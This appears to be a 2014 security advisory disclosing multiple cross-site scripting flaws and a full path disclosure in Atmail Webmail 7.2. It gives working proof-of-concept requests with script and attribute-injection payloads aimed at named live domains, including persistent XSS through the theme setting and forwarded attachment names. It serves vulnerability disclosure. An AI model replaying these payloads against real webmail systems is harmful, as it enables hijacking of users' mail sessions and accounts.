@@ -1,0 +1,80 @@
+#Title: Atmail Webmail =>7.2 - Multiple XSS & FPD
+#Date: 01.27.2014
+#Vendor: atmail.com
+#Version: =>7.2 (Latest ATM), tested also on 7.1.1
+#Authors: Smash_ & Brag / smash[at]devilteam.pl
+#PoC: poczta.pl / demo.atmail.com
+ 
+1. Cross Site Scripting
+ 
+ a) GET - viewmessageTabNumber
+ 
+Request:
+host/mail/index.php/mail/composemessage/index/viewmessageTabNumber/3"><h1>XSS<!--
+ 
+Injection point (line 16):
+<input type="hidden" name="tabId" value="viewmessageTab3"><h1>XSS<!--
+ 
+PoC:
+https://www.poczta.pl/mail/index.php/mail/composemessage/index/viewmessageTabNumber/3"><h1>XSS<!--
+ 
+ b) POST - filter
+ 
+ 
+POST /mail/index.php/mail/mail/listfoldermessages/searching/true/selectFolder/INBOX.666/resultContext/searchResultsTab1 HTTP/1.1
+Host: www.poczta.pl
+searchQuery=&goBack=6&from=&to=&subject=&body=&filter=<script>alert(666)</script>
+ 
+Alert will appear; injection point:
+<div id=\"noMessageDisplay\" style=\"margin:10px;\">\n\t\t\t\tFound no messages matching <script>alert(666) (...)
+ 
+ c) POST - Search Results Tab
+ 
+Request:
+POST /mail/index.php/mail/mail/listfoldermessages/searching/true/selectFolder/INBOX/resultContext/searchResultsTab1"%20whats="up"%20bad=" HTTP/1.1
+Host: http://www.poczta.pl
+ 
+Injection point:
+<input type=\"hidden\" name=\"resultContext\" id=\"resultContext\" value=\"searchResultsTab1\" whats=\"up\" bad=\"\" \/>
+ 
+d) POST - page
+ 
+Request:
+POST /mail/index.php/mail/mail/listfoldermessages/selectFolder/INBOX/page/2"%20xss="true"%20bad=" HTTP/1.1
+Host: www.poczta.pl
+ 
+Injection point:
+<input type=\"hidden\" name=\"pageNumber\" id=\"pageNumber\" value=\"2\" xss=\"true\" bad=\"\" \/>
+ 
+ 
+2. Full Path Disclosure
+ 
+Request (GET):
+demo.atmail.com/mail/index.php/mail/mail/listfoldermessages/
+ 
+Response:
+An error occurred
+script 'mail/listfoldermessages.phtml' not found in path (/usr/local/atmail/webmail/application/modules/mail/views/scripts/)
+ 
+3. Persistent XSS - Theme Color
+ 
+Request:
+GET /mail/index.php/mail/settings/webmailsave?fields%5BcssColorTheme%5D=purple"%20onload=alert(666)%20bad="&save=1 HTTP/1.1
+Host: www.poczta.pl
+ 
+Now, whenever someone will login alert will appear.
+Injection point:
+<body class="leaderboard-ad-off footer-ad-off '"XSS fresh blue" onload=alert(666) bad="" id="calon">
+ 
+4. Persistent XSS - Forward a Message
+ 
+First, compose your message and attach an image. Image name should consist
+JS code, for example: "><img src=x onerror=prompt(1)>.
+ 
+Send message to a victim, whenever someone will 'Forward' the message,
+JS will be executed:
+ 
+<a class=\"attach-btn\" href=\"#\" onClick=\"removeAttachment('bobs.\\\"><img src=x onerror=prompt(1)> (...)
+ 
+P.S - Login and password are sent as plaintext.
+                                        ... which is bad.
